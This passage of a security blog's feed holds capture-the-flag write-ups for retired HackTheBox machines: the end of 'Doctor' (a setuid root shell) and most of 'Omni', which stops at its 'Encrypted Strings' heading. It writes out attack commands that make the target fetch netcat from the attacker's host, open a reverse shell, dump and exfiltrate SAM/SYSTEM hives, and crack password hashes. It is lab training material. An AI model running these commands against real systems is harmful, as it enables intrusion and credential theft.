+&lt;span class="code-line"&gt;&amp;lt;?xml-stylesheet type=&amp;quot;text/xml&amp;quot; href=&amp;quot;/static/atom.xsl&amp;quot;?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;feed xmlns=&amp;quot;http://www.w3.org/2005/Atom&amp;quot; xmlns:s=&amp;quot;http://dev.splunk.com/ns/rest&amp;quot; xmlns:opensearch=&amp;quot;http://a9.com/-/spec/opensearch/1.1/&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;title&amp;gt;localapps&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;id&amp;gt;https://127.0.0.1:8089/services/apps/local&amp;lt;/id&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;updated&amp;gt;2020-09-29T11:22:44+02:00&amp;lt;/updated&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;generator build=&amp;quot;a1a6394cc5ae&amp;quot; version=&amp;quot;8.0.5&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;author&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &amp;lt;name&amp;gt;Splunk&amp;lt;/name&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;/author&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;link href=&amp;quot;/services/apps/local/_new&amp;quot; rel=&amp;quot;create&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;link href=&amp;quot;/services/apps/local/_reload&amp;quot; rel=&amp;quot;_reload&amp;quot;/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;opensearch:totalResults&amp;gt;0&amp;lt;/opensearch:totalResults&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;opensearch:itemsPerPage&amp;gt;30&amp;lt;/opensearch:itemsPerPage&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;opensearch:startIndex&amp;gt;0&amp;lt;/opensearch:startIndex&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &amp;lt;s:messages/&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/feed&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[!] If all went well run /tmp/.tester/bin/shdoor -p for a root shell&lt;/span&gt;
+&lt;span class="code-line"&gt;[!] Run whoami if your prompt didn&amp;#39;t change...&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[!] DELETE THE .tester DIRECTORY AS ROOT WHEN YOU&amp;#39;RE DONE! [!]&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We then run the binary &lt;code&gt;shdoor&lt;/code&gt; and get a root shell allowing us to retrive the
+root flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;shaun@doctor:/tmp$ /tmp/.tester/bin/shdoor -p&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;/tmp/.tester/bin/shdoor -p&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;# id&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;id&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;uid=1002(shaun) gid=1002(shaun) euid=0(root) groups=1002(shaun)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;# cat /root/root.txt&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;cat /root/root.txt&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;d32cd0d4b24856&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="SSTI"></category><category term="Splunk"></category></entry><entry><title>HTB: Omni</title><link href="https://maggick.fr/2021/02/htb-omni.html" rel="alternate"></link><published>2021-02-07T18:15:00+01:00</published><updated>2021-02-07T18:15:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-02-07:/2021/02/htb-omni.html</id><summary type="html">&lt;p&gt;&lt;img alt="Omni Card" class="align-left" src="/media/2021.02/omni_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/271"&gt;Omni&lt;/a&gt; publish on
+August 22, 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt;.
+This box is rated as easy box. I was mostly intrigue by the "Other" operating
+system. It implies some Google search, a RAT and SecureStrings.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.02/omni_card.png" alt="Omni Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This box is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/271"&gt;Omni&lt;/a&gt; publish on
+August 22, 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt;.
+This box is rated as easy box. I was mostly intrigue by the "Other" operating
+system. It implies some Google search, a RAT and SecureStrings.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. The box is quit busy so first of all we
+run a simple aggressive TCP scan:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;# Nmap 7.80 scan initiated Mon Aug 31 11:13:25 2020 as: nmap -p- -oN nmap -sSV 10.10.10.204&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Nmap scan report for 10.10.10.204&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Host is up (0.079s latency).&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Not shown: 65529 filtered ports&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;PORT      STATE SERVICE  VERSION&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;135/tcp   open  msrpc    Microsoft Windows RPC&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;5985/tcp  open  upnp     Microsoft IIS httpd&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;8080/tcp  open  upnp     Microsoft IIS httpd&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;29817/tcp open  unknown&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;29819/tcp open  arcserve ARCserve Discovery&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;29820/tcp open  unknown&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c"&gt;SF-Port29820-TCP:V=7.80%I=7%D=8/25%Time=5F452B08%P=x86_64-pc-linux-gnu%r(N&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c"&gt;SF:ULL,10,&amp;quot;\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&amp;quot;)%r(GenericLines,10,&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c"&gt;SF:\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12&amp;quot;)%r(Help,10,&amp;quot;\*LY\xa5\xfb`\x0&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c"&gt;SF:4G\xa9m\x1c\xc9}\xc8O\x12&amp;quot;)%r(JavaRMI,10,&amp;quot;\*LY\xa5\xfb`\x04G\xa9m\x1c\x&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="c"&gt;SF:c9}\xc8O\x12&amp;quot;);&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="err"&gt;Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;This look like a Windows Server with some strange open ports. When trying to
+access the web service on port 8080 we got a basic auth with the message
+"Windows Device Portal". We google to find the default user and password
+&lt;code&gt;administrator:p@ssw0rd&lt;/code&gt; but they don't work here. So we google for just "Windows Device Portal".&lt;/p&gt;
+&lt;p&gt;We learn that this is a Windows IOT operating system. We search for "Windows IOT exploit"
+but that lead us to a lot of general media article. So we specify our search to
+"Windows IOT exploit github". We found some &lt;a href="https://github.com/SafeBreach-Labs/SirepRAT"&gt;python code to exploit the Sirep
+service&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id="rce-and-reverse-shell"&gt;RCE and reverse shell&lt;/h2&gt;
+&lt;p&gt;We install the python2 dependencies and quickly realize that there is a bug with the &lt;code&gt;enum&lt;/code&gt; library.
+A few Google search told us that we need to use the &lt;code&gt;aenum&lt;/code&gt; library instead of &lt;code&gt;enum&lt;/code&gt;
+So we modify each &lt;code&gt;from enum import Enum&lt;/code&gt; to &lt;code&gt;from aenum import Enum&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Then we can use the tool to execute command on the system. After a few classic
+commands we upload netcat (&lt;code&gt;/usr/share/windows-binaries/nc.exe&lt;/code&gt;)
+to the box using the python HTTP server (&lt;code&gt;python3 -m http.server&lt;/code&gt;) and writing
+it directly in &lt;code&gt;C:\&lt;/code&gt;. Then we run it to get a reverse shell, but this trigger an error as out netcat is a 32bits
+binary.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &amp;quot;C:\Windows\System32\cmd.exe&amp;quot; --args &amp;quot; /c PowerShell Invoke-WebRequest -OutFile C:\\nc.exe -Uri http://10.10.14.119:8000/nc.exe&amp;quot; --v&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &amp;quot;C:\Windows\System32\cmd.exe&amp;quot; --args &amp;quot; /c C:\\nc.exe 10.10.14.119 1234 -e cmd.exe&amp;quot; --v---------&lt;/span&gt;
+&lt;span class="code-line"&gt;This version of C:\nc.exe is not compatible with the version of Windows you&amp;#39;re running. Check your computer&amp;#39;s system information and then contact the software publisher.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We download nc64.exe from the
+&lt;a href="https://github.com/int0x33/nc.exe/raw/master/nc64.exe"&gt;internet&lt;/a&gt;,
+re-upload it and run it again.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_omni/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &amp;quot;C:\Windows\System32\cmd.exe&amp;quot; --args &amp;quot; /c PowerShell Invoke-WebRequest -OutFile C:\\nc64.exe -Uri http://10.10.14.119:8000/nc64.exe&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;kali@kali:~/pown/htb_omni/SirepRAT$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &amp;quot;C:\Windows\System32\cmd.exe&amp;quot; --args &amp;quot; /c C:\\nc64.exe 10.10.14.119 1234 -e cmd.exe&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We run a netcat listener at the same time and get a shell as &lt;code&gt;NT/SYTSEM&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:/tmp/srv$ nc -l -p 1234&lt;/span&gt;
+&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.17763.107]&lt;/span&gt;
+&lt;span class="code-line"&gt;Copyright (c) Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;echo %username% &lt;/span&gt;
+&lt;span class="code-line"&gt;echo %username%&lt;/span&gt;
+&lt;span class="code-line"&gt;omni$&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;Powershell&lt;/span&gt;
+&lt;span class="code-line"&gt;Powershell&lt;/span&gt;
+&lt;span class="code-line"&gt;Windows PowerShell &lt;/span&gt;
+&lt;span class="code-line"&gt;Copyright (C) Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PS C:\windows\system32&amp;gt; [System.Security.Principal.WindowsIdentity]::GetCurrent().Name&lt;/span&gt;
+&lt;span class="code-line"&gt;[System.Security.Principal.WindowsIdentity]::GetCurrent().Name&lt;/span&gt;
+&lt;span class="code-line"&gt;NT AUTHORITY\SYSTEM&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;As we are system we could access all file on the system. We found &lt;code&gt;user.txt&lt;/code&gt; and
+&lt;code&gt;root.txt&lt;/code&gt; in &lt;code&gt;C:\Data\Users\app&lt;/code&gt; and &lt;code&gt;C:\Data\Users\Adminsitrator&lt;/code&gt; but the
+content of the file is an &lt;a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7#example-2--create-a-secure-string-from-an-encrypted-string-in-a-file"&gt;Encrypted
+String&lt;/a&gt;.
+We will need to be the &lt;code&gt;app&lt;/code&gt; and &lt;code&gt;administrator&lt;/code&gt; users to decrypt the files. We
+also notice the &lt;code&gt;hardening.txt&lt;/code&gt; and &lt;code&gt;iot-admin.xml&lt;/code&gt; files. The first one is just
+a text file with some (unimportant) informations about the box's configuration.
+The second one seems to be the &lt;code&gt;administrator&lt;/code&gt; user's password as an Encrypted
+String. So once we are the &lt;code&gt;app&lt;/code&gt; user we would quickly be able to get the user
+flag and the &lt;code&gt;administrator&lt;/code&gt; password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\windows\system32&amp;gt;cd C:\Data&lt;/span&gt;
+&lt;span class="code-line"&gt;cd C:\Data&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Data&amp;gt;dir&lt;/span&gt;
+&lt;span class="code-line"&gt;dir&lt;/span&gt;
+&lt;span class="code-line"&gt;Volume in drive C is MainOS&lt;/span&gt;
+&lt;span class="code-line"&gt;Volume Serial Number is 3C37-C677&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Directory of C:\Data&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;10/26/2018  11:37 PM    &amp;lt;DIR&amp;gt;          CrashDump&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  12:22 AM                 0 FirstBoot.Complete&lt;/span&gt;
+&lt;span class="code-line"&gt;10/26/2018  11:37 PM    &amp;lt;DIR&amp;gt;          Logfiles&lt;/span&gt;
+&lt;span class="code-line"&gt;10/26/2018  11:37 PM    &amp;lt;DIR&amp;gt;          Programs&lt;/span&gt;
+&lt;span class="code-line"&gt;07/03/2020  11:22 PM    &amp;lt;DIR&amp;gt;          SharedData&lt;/span&gt;
+&lt;span class="code-line"&gt;07/03/2020  11:22 PM    &amp;lt;DIR&amp;gt;          SystemData&lt;/span&gt;
+&lt;span class="code-line"&gt;10/26/2018  11:38 PM    &amp;lt;DIR&amp;gt;          test&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Users&lt;/span&gt;
+&lt;span class="code-line"&gt;10/26/2018  11:38 PM    &amp;lt;DIR&amp;gt;          Windows&lt;/span&gt;
+&lt;span class="code-line"&gt;              1 File(s)              0 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;              8 Dir(s)   4,691,017,728 bytes free&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Data&amp;gt;cd Users\app&lt;/span&gt;
+&lt;span class="code-line"&gt;cd Users\app&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Data\Users\app&amp;gt;dir&lt;/span&gt;
+&lt;span class="code-line"&gt;dir&lt;/span&gt;
+&lt;span class="code-line"&gt;Volume in drive C is MainOS&lt;/span&gt;
+&lt;span class="code-line"&gt;Volume Serial Number is 3C37-C677&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Directory of C:\Data\Users\app&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  09:53 PM    &amp;lt;DIR&amp;gt;          .&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  09:53 PM    &amp;lt;DIR&amp;gt;          ..&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          3D Objects&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Documents&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Downloads&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Favorites&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  08:20 PM               344 hardening.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  08:14 PM             1,858 iot-admin.xml&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Music&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Pictures&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  09:53 PM             1,958 user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;07/04/2020  07:28 PM    &amp;lt;DIR&amp;gt;          Videos&lt;/span&gt;
+&lt;span class="code-line"&gt;              3 File(s)          4,160 bytes&lt;/span&gt;
+&lt;span class="code-line"&gt;              9 Dir(s)   4,691,017,728 bytes free&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Data\Users\app&amp;gt;type hardening&lt;/span&gt;
+&lt;span class="code-line"&gt;type hardening&lt;/span&gt;
+&lt;span class="code-line"&gt;The system cannot find the file specified.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Data\Users\app&amp;gt;type hardening.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;type hardening.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;- changed default administrator password of &amp;quot;p@ssw0rd&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;- added firewall rules to restrict unnecessary services&lt;/span&gt;
+&lt;span class="code-line"&gt;- removed administrator account from &amp;quot;Ssh Users&amp;quot; group&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="dumping-hashes"&gt;Dumping hashes&lt;/h2&gt;
+&lt;p&gt;As we are &lt;code&gt;SYSTEM&lt;/code&gt; we can dump the &lt;code&gt;SYSTEM&lt;/code&gt; and &lt;code&gt;SAM&lt;/code&gt; hive to extract the users
+passwords' hashes with &lt;code&gt;reg save&lt;/code&gt;. We then transfer them to our Kali box using
+netcat.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;C:\windows\system32&amp;gt;reg save hklm\system C:\system&lt;/span&gt;
+&lt;span class="code-line"&gt;reg save hklm\system C:\system&lt;/span&gt;
+&lt;span class="code-line"&gt;The operation completed successfully.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\windows\system32&amp;gt; reg save hklm\sam c:\sam&lt;/span&gt;
+&lt;span class="code-line"&gt;reg save hklm\sam c:\sam&lt;/span&gt;
+&lt;span class="code-line"&gt;The operation completed successfully.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;cd c:\&lt;/span&gt;
+&lt;span class="code-line"&gt;cd c:\&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;c:\&amp;gt;nc64.exe 10.10.14.119 1235 &amp;lt; system&lt;/span&gt;
+&lt;span class="code-line"&gt;nc64.exe 10.10.14.119 1235 &amp;lt; system&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;c:\&amp;gt;nc64.exe 10.10.14.119 1235 &amp;lt; sam&lt;/span&gt;
+&lt;span class="code-line"&gt;nc64.exe 10.10.14.119 1235 &amp;lt; sam&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="cracking-hashes"&gt;Cracking hashes&lt;/h2&gt;
+&lt;p&gt;Once transfered we use &lt;a href="https://github.com/SecureAuthCorp/impacket"&gt;impacket's&lt;/a&gt;
+secret dump to extract the hashes from the &lt;code&gt;SAM&lt;/code&gt; and &lt;code&gt;SYSTEM&lt;/code&gt; files.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/installed_tools/impacket/examples$ python3 secretsdump.py -sam ~/pown/sam -system ~/pown/system -outputfile out LOCAL&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)&lt;/span&gt;
+&lt;span class="code-line"&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::&lt;/span&gt;
+&lt;span class="code-line"&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::&lt;/span&gt;
+&lt;span class="code-line"&gt;sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::&lt;/span&gt;
+&lt;span class="code-line"&gt;DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::&lt;/span&gt;
+&lt;span class="code-line"&gt;app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Cleaning up...&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We run john on the collected hashes and get the &lt;code&gt;app&lt;/code&gt; user password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@fomalhaut htb_omni]$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8 --rules --format=NT&lt;/span&gt;
+&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;Loaded 6 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])&lt;/span&gt;
+&lt;span class="code-line"&gt;Node numbers 1-8 of 8 (fork)&lt;/span&gt;
+&lt;span class="code-line"&gt;Each node loaded 1/8 of wordfile to memory (about 16 MB/node)&lt;/span&gt;
+&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
+&lt;span class="code-line"&gt;                (Guest)&lt;/span&gt;
+&lt;span class="code-line"&gt;mesh5143         (app)&lt;/span&gt;
+&lt;span class="code-line"&gt;7 1g 0:00:00:09 DONE (2020-08-28 11:14) 0.1009g/s 2951Kp/s 2951Kc/s 14755KC/s Aateetaing..Aaaaaaaaaaaawing&lt;/span&gt;
+&lt;span class="code-line"&gt;5 1g 0:00:00:09 DONE (2020-08-28 11:14) 0.1005g/s 2939Kp/s 2939Kc/s 14769KC/s Abbyramying..Aaaaaaaaaaaaing&lt;/span&gt;
+&lt;span class="code-line"&gt;2 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2921Kp/s 2921Kc/s 17530KC/s Aanyahing..Aaaaaaaaaaaaaaaaaaaaaaaaain&lt;/span&gt;
+&lt;span class="code-line"&gt;6 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2921Kp/s 2921Kc/s 17529KC/s Abdelaing..Aaaaazing&lt;/span&gt;
+&lt;span class="code-line"&gt;4 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2912Kp/s 2912Kc/s 17475KC/s Aberdaying..Aaaaaaaaaaaaaaaing&lt;/span&gt;
+&lt;span class="code-line"&gt;3 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2909Kp/s 2909Kc/s 17456KC/s Abgboing..Aaaaaaaaaaaaaaaaaaaaaing&lt;/span&gt;
+&lt;span class="code-line"&gt;8 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2897Kp/s 2897Kc/s 17382KC/s Abeloliving..Aaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/span&gt;
+&lt;span class="code-line"&gt;1 0g 0:00:00:10 DONE (2020-08-28 11:14) 0g/s 2855Kp/s 2855Kc/s 17130KC/s Abigayling..Soleiling&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We then connect to the web service on port 8080 using this credentials. There is
+specific page to run command.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="User interface" src="/media/2021.02/omni_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;We just run netcat to get a reverse shell as &lt;code&gt;app&lt;/code&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ nc -l -p 1234&lt;/span&gt;
+&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.17763.107]&lt;/span&gt;
+&lt;span class="code-line"&gt;Copyright (c) Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\windows\system32&amp;gt;echo %username%&lt;/span&gt;
+&lt;span class="code-line"&gt;app&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="encrypted-strings"&gt;Encrypted Strings&lt;/h2&gt;
